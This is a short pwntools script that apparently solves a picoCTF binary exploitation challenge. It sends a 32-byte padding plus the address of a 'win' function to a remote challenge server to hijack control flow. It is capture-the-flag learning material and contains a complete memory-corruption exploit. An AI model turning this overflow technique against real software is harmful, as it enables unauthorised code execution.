from pwn import*

conn = remote("mimas.picoctf.net", 52743)
p = process("chall")
elf = context.binary = ELF("chall", checksec=False)
win_addr_in_dec = elf.sym['win'] # 4198816

payload = b"A"*32 + p64(win_addr_in_dec)

conn.sendline(b"2")
conn.sendline(payload)
conn.sendline(b"4")
conn.interactive()

